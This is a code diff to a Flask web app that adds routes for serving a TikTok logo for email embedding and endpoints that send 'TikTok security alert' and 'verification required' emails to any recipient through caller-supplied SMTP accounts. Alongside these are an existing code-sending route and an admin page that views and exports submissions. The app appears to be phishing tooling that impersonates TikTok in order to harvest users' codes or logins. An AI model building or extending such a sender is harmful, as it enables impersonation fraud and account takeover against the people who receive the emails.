@@ -8,7 +8,7 @@ import os
 import json
 import logging
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, redirect, url_for
+from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
 from flask_cors import CORS
 
 # Configure logging
@@ -128,6 +128,46 @@ def send_code():
             'message': 'Error sending code'
         }), 500
 
+@app.route('/logo/<filename>')
+def serve_logo(filename):
+    """Serve logo files for email embedding"""
+    try:
+        # Determine MIME type based on file extension
+        if filename.lower().endswith('.jpg') or filename.lower().endswith('.jpeg'):
+            mimetype = 'image/jpeg'
+        elif filename.lower().endswith('.png'):
+            mimetype = 'image/png'
+        else:
+            mimetype = 'image/jpeg'  # Default to JPEG
+            
+        return send_from_directory('static', filename, mimetype=mimetype)
+    except Exception as e:
+        logger.error(f"Error serving logo {filename}: {e}")
+        return "Logo not found", 404
+
+@app.route('/tiktok-logo')
+def serve_tiktok_logo():
+    """Serve the TikTok logo for email embedding (legacy route)"""
+    return serve_logo('logo.jpg')
+
+@app.route('/email-tester')
+def email_tester():
+    """Serve the TikTok email tester page"""
+    try:
+        return render_template('tiktok_email_tester.html')
+    except Exception as e:
+        logger.error(f"Error serving email tester page: {e}")
+        return "Error loading email tester page", 500
+
+@app.route('/custom-email-sender')
+def custom_email_sender():
+    """Serve the custom email sender page"""
+    try:
+        return render_template('custom_email_sender.html')
+    except Exception as e:
+        logger.error(f"Error serving custom email sender page: {e}")
+        return "Error loading custom email sender page", 500
+
 @app.route('/admin')
 def admin_dashboard():
     """Admin dashboard to view submissions"""
@@ -182,6 +222,112 @@ def export_data():
     except Exception as e:
         logger.error(f"Error exporting data: {e}")
         return jsonify({'error': 'Failed to export data'}), 500
+
+@app.route('/send-tiktok-email', methods=['POST'])
+def send_tiktok_email():
+    """Send TikTok security email"""
+    try:
+        data = request.get_json()
+        
+        # Extract email data
+        recipient_email = data.get('email', '')
+        email_type = data.get('type', 'security_alert')
+        username = data.get('username', 'user')
+        
+        # Import TikTok email functions
+        from smtp import send_tiktok_security_alert, send_tiktok_verification_required
+        
+        success = False
+        if email_type == 'security_alert':
+            success = send_tiktok_security_alert(recipient_email, 'new_device', username)
+        elif email_type == 'verification_required':
+            success = send_tiktok_verification_required(recipient_email, username)
+        else:
+            return jsonify({
+                'success': False,
+                'message': 'Invalid email type. Use "security_alert" or "verification_required"'
+            }), 400
+        
+        if success:
+            logger.info(f"TikTok email sent successfully - Type: {email_type}, To: {recipient_email}")
+            return jsonify({
+                'success': True,
+                'message': f'TikTok {email_type} email sent successfully!',
+                'email_type': email_type,
+                'recipient': recipient_email
+            })
+        else:
+            return jsonify({
+                'success': False,
+                'message': 'Failed to send TikTok email'
+            }), 500
+            
+    except Exception as e:
+        logger.error(f"Error sending TikTok email: {e}")
+        return jsonify({
+            'success': False,
+            'message': 'Error sending TikTok email'
+        }), 500
+
+@app.route('/send-custom-email', methods=['POST'])
+def send_custom_email():
+    """Send custom email with user-provided SMTP settings"""
+    try:
+        data = request.get_json()
+        
+        # Extract email configuration
+        template = data.get('template', 'tiktok_security')
+        smtp_server = data.get('smtp_server', 'smtp.gmail.com')
+        smtp_port = data.get('smtp_port', 587)
+        sender_email = data.get('sender_email', '')
+        sender_password = data.get('sender_password', '')
+        recipient_email = data.get('recipient_email', '')
+        subject = data.get('subject', '')
+        username = data.get('username', 'user')
+        custom_message = data.get('custom_message', '')
+        
+        # Validate required fields
+        if not all([sender_email, sender_password, recipient_email, subject]):
+            return jsonify({
+                'success': False,
+                'message': 'Missing required fields: sender_email, sender_password, recipient_email, subject'
+            }), 400
+        
+        # Import and use custom SMTP function
+        from smtp import send_custom_tiktok_email
+        
+        success = send_custom_tiktok_email(
+            smtp_server=smtp_server,
+            smtp_port=smtp_port,
+            sender_email=sender_email,
+            sender_password=sender_password,
+            recipient_email=recipient_email,
+            subject=subject,
+            template=template,
+            username=username,
+            custom_message=custom_message
+        )
+        
+        if success:
+            logger.info(f"Custom email sent successfully - Template: {template}, To: {recipient_email}")
+            return jsonify({
+                'success': True,
+                'message': f'Custom {template} email sent successfully to {recipient_email}!',
+                'template': template,
+                'recipient': recipient_email
+            })
+        else:
+            return jsonify({
+                'success': False,
+                'message': 'Failed to send custom email. Check your SMTP settings and credentials.'
+            }), 500
+            
+    except Exception as e:
+        logger.error(f"Error sending custom email: {e}")
+        return jsonify({
+            'success': False,
+            'message': f'Error sending custom email: {str(e)}'
+        }), 500
 
 @app.route('/health')
 def health_check():
